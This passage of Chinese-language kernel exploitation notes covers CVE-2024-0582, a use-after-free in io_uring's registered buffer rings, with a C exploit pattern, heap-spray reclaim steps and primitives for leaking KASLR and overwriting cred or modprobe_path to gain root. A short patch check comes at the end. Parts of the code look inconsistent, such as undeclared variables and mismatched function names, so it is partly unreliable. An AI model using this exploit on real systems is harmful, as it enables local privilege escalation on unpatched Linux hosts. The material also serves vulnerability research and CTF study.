| 利用路径 | 注册 PBUF_RING → 堆喷阻塞在 `io_buffer` 上的 `PROVIDE_BUFFERS` → 注销环（UAF 释放）→ 用可控数据重新占用 `bl` → 完成被阻塞的请求 → 内核把攻击者控制的 `bid`/`resv` 写入已释放的 `io_buffer` → 类型混淆 / ROP | 无法重新占用 SQE 环条目；没有 UAF 原语 |

**利用模式（KernelCTF 2024）：**

```c
// 1. Register a PBUF_RING of size 0x1000
struct io_uring_params p = {};
int ring_fd = io_uring_setup(8, &p);
struct io_uring_buf_ring *br;
posix_memalign((void**)&br, 4096, 4096);
io_uring_register_buf_ring(ring_fd, &(struct io_uring_buf_reg){
    .ring_addr = (unsigned long)br,
    .ring_entries = 16,
    .bgid = 1,
});

// 2. Spray blocking PROVIDE_BUFFERS that pin the ring
for (int i = 0; i < 16; i++) {
    struct io_uring_sqe *sqe = &sqes[i];
    io_uring_prep_provide_buffers(sqe, br, 0, 16, 1, 0);
    sqe->flags |= IOSQE_IO_LINK; // keep request pending
}
io_uring_submit(ring_fd);

// 3. Unregister while requests are still in-flight → UAF free of io_buffer_list
io_uring_unregister_buf_ring(ring_fd, 1); // kfree(bl) but sqes still reference bl->bufs

// 4. Heap spray to reclaim UAF slot (e.g., msg_msg, seq_operations, cred)
spray_kmalloc_1024(controlled_data); // reclaim io_buffer_list with fake buf_ring pointer

// 5. Complete pending requests — kernel writes to reclaimed buffer as if it were buf_ring
//    → arbitrary kernel write (controlled bid offset) or info leak via IORING_OP_READ
```

**关键原语：**
- **泄漏：** 释放环后，从待处理的 `provide_buffers` 发起 `IORING_OP_READ`，泄漏被重新占用的堆内容（含 `msg_msg` 的 `m_list` 指针 -> kheap/kaslr）。
- **写：** 用 `cred` 或与 `modprobe_path` 相邻的对象重新占用；完成请求即可覆写 `uid` 或函数指针。

**检测与补丁检查：**
```bash
# Vulnerable kernels: 6.4 - 6.6.13, 6.7 prior to 6.7.2
uname -r
# Check patch: io_uring/io_uring.c should have io_buffer_list_put() + synchronize
grep -n "io_buffer_list_put\|pbuf.*ref" io_uring/register.c
```

**关键点：** 这个 bug *只*存在于**内核注册的 PBUF_RING** 路径（`register`/`unregister`），不在通用的用户态 SQE `PROVIDE_BUFFERS` 路径中。许多公开 PoC 混淆了二者，试图释放 SQ 环本身（那只是 `mmap` 出来的用户态内存）。成功的利用必须使用 `IORING_REGISTER_PBUF_RING` 分配内核 `io_buffer_list`，然后让 `UNREGISTER` 与待处理的 `PROVIDE_BUFFERS` 竞态——UAF 就发生在该竞态中。

**参考：** CVE-2024-0582，KernelCTF 2024，补丁 `f0b09d80f55e`（2024 年 2 月）。
